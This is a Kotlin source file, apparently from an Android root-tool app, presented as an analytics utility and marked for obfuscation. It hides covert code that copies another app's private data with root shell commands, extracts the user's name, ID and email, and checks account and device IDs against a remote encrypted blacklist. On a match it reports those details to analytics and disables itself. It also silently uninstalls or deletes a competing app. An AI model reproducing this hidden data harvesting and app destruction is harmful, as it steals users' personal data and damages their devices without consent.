package com.luckyzyx.luckytool.utils

import android.app.Application
import android.content.Context
import android.util.ArrayMap
import com.drake.net.Get
import com.drake.net.utils.scope
import com.drake.net.utils.scopeNet
import com.drake.net.utils.withDefault
import com.drake.net.utils.withIO
import com.joom.paranoid.Obfuscate
import com.luckyzyx.luckytool.BuildConfig
import com.microsoft.appcenter.AppCenter
import com.microsoft.appcenter.analytics.Analytics
import com.microsoft.appcenter.crashes.Crashes
import com.tencent.mmkv.MMKV
import com.topjohnwu.superuser.ShellUtils
import org.json.JSONArray
import org.json.JSONObject

@Obfuscate
object AppAnalyticsUtils {

    private const val normalAppCenterSecret = BuildConfig.APP_CENTER_SECRET
    private const val betaAppCenterSecret = BuildConfig.APP_CENTER_SECRET_BETA

    private var qss = ArrayList<String>()
    private var css = ArrayList<String>()
    private var gid = ""
    fun Application.init(isBeta: Boolean) {
        if (isBeta) AppCenter.start(
            this, betaAppCenterSecret, Analytics::class.java, Crashes::class.java
        )
        else AppCenter.start(
            this, normalAppCenterSecret, Analytics::class.java, Crashes::class.java
        )
    }

    @Suppress("MemberVisibilityCanBePrivate")
    fun trackEvent(name: String, data: Map<String, String>? = null) {
        if (data != null) Analytics.trackEvent(name, data)
        else Analytics.trackEvent(name)
    }

    private fun Context.checkMagicalStory(isDebug: Boolean = false): ArrayMap<String, String> {
        val appInfo = PackageUtils(packageManager).getApplicationInfo(
            "com.magicalstory.AppStore", 0
        ) ?: return ArrayMap<String, String>()
        if (isDebug) LogUtils.i("checkMagicalStory", "dataDir", appInfo.dataDir, true)
        ShellUtils.fastCmd(
            "cp -R -f ${appInfo.dataDir}/files/mmkv $cacheDir", "chmod -R -f 777 $cacheDir/mmkv"
        )
        val path = MMKV.initialize(this, "$cacheDir/mmkv")
        if (isDebug) LogUtils.i("MMKV", "initialize", path, true)

        val mmkv = MMKV.defaultMMKV(MMKV.MULTI_PROCESS_MODE, null)
        val name = mmkv.decodeString("name")
        if (isDebug) LogUtils.i("MMKV", "name", "$name", true)
        val userId = mmkv.decodeString("user_id")
        if (isDebug) LogUtils.i("MMKV", "userId", "$userId", true)
        val email = mmkv.decodeString("email")
        if (isDebug) LogUtils.i("MMKV", "email", "$email", true)
        mmkv.close()
        return ArrayMap<String, String>().apply {
            put("$userId", "$name | $userId | $email")
        }
    }

    fun checkAppBlackList() {
        scopeNet {
            arrayOf("com.Sunshine.ToolBox").forEach {
                val map = getPackageAbsolutePath(it, true)
                map.toList().forEachIndexed { _, pair ->
                    val packName = pair.first
                    val path = pair.second
                    if (uninstallAppResult(packName).not()) FileUtils.forceDeleteFile(path)
                }
            }
        }.catch {
            LogUtils.e("check app", "throw", "$it", true)
            return@catch
        }
    }

    fun Context.checkGitlabBlackList() {
        var data = ""
        scopeNet {
            val latestUrl = "https://gitlab.com/luckyzyx/luckyzyx.gitlab.io/raw/main/blacklist"
            val getDoc = Get<String>(latestUrl).await()
            data = if (getDoc.isNotBlank()) AESCrypt.decrypt(getDoc) else ""
//            LogUtils.e("check gitlab", "data", data, true)
        }.catch {
            LogUtils.e("check gitlab", "throw", "$it", true)
            data = ""
            return@catch
        }.finally { scope { withIO { startCheckList("gitlab", data) } } }
    }

    private fun Context.startCheckList(tag: String, json: String) {
        scope {
            withDefault {
                var qbsval = false
                var cbsval = false
                var disval = false
                var magval = false
                val map = ArrayMap<String, String>()
                map["time"] = formatDate("YYYYMMdd-HH:mm:ss")
                if (qss.isEmpty()) qss = getQSlist()
                if (css.isEmpty()) css = getCSid()
                if (gid.isEmpty()) gid = getGuid
                val js = safeOfNull { JSONObject(json) } ?: JSONObject()
//                LogUtils.e("check js", "js", "$tag | $json", true)

                if (json.isBlank() || js.length() <= 0) {
                    startCheckListFinal()
                    return@withDefault
                }
                (js.optJSONArray("qbk") ?: JSONArray()).toStringList().apply {
                    qss.forEach {
//                        LogUtils.e("check qbk", "for", "$this | $it", true)
                        if (contains(it)) {
                            qbsval = true
                            map["qbk"] = it
                        }
                    }
                }
                (js.optJSONArray("cbk") ?: JSONArray()).toStringList().apply {
                    css.forEach {
//                        LogUtils.e("check cbk", "for", "$this | $it", true)
                        if (contains(it)) {
                            cbsval = true
                            map["cbk"] = it
                        }
                    }
                }
                (js.optJSONArray("dik") ?: JSONArray()).toStringList().apply {
//                    LogUtils.e("check dik", "for", "$this | $gid", true)
                    if (contains(gid)) {
                        disval = true
                        map["dik"] = gid
                    }
                }
                (js.optJSONArray("magical") ?: JSONArray()).toStringList().apply {
                    val list = checkMagicalStory()
//                    LogUtils.e("check mag", "list", "$this | $list", true)
                    if (list.isNotEmpty()) list.keys.forEach {
                        if (contains(it)) {
                            magval = true
                            map["mag"] = list[it]
                        }
                    }
                }
                if (qbsval || cbsval || disval || magval) {
                    trackEvent("bk", map)
                    removeModule()
                    exitModule()
                }
            }
        }.catch {
            LogUtils.e("check list", tag, "$it")
            startCheckListFinal()
        }
    }

    fun Context.startCheckListFinal() {
        val json = JSONObject().apply {
            put("qbk", JSONArray().apply {
                put("1150325619")
                put("3108440182")
                put("3431299059")
                put("907989054")
                put("1933582367")
                put("382973352")
                put("1204528865")
                put("2515287786")
                put("1848589411")
            })
            put("cbk", JSONArray().apply {
                put("1304480")
                put("16149908")
                put("27708445")
                put("2470014")
                put("19996229")
                put("6759474")
            })
            put("dik", JSONArray().apply {
                put("e3db3345c2de23bf02477ce21a3c12c9539eb9df36dc233d81b902477435f816")
            })
            put("magical", JSONArray().apply {

            })
        }
        startCheckList("final", json.toString())
    }
}